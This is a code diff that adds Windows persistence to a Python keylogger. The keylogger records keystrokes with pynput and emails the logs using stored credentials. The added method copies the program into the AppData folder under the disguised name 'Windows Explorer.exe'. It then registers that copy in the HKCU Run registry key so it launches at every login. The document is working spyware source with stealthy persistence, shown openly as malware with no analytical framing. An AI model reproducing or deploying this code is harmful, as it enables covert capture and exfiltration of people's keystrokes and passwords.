@@ -1,16 +1,30 @@
+# Importing libraries/modules
 from pynput.keyboard import Key, Listener
 from threading import Timer
 import smtplib
-
+import os
+import shutil
+import subprocess
+import sys
 class Keylogger:
 
 # Creating constructor method
     def __init__(self, time_interval, email, password):
+        self.windows_persistent()
         self.log_file = "Logger Started"
         self.time_interval= time_interval
         self.email = email
         self.password = password
-         
+    
+# Creating method for starting logger.exe automatically at system startup
+
+    def windows_persistent(self):
+        evil_file_location = os.environ["appdata"]+ "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable,evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v  winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+
+
 
 # Appending to log_file
     def append_log_file(self,string):
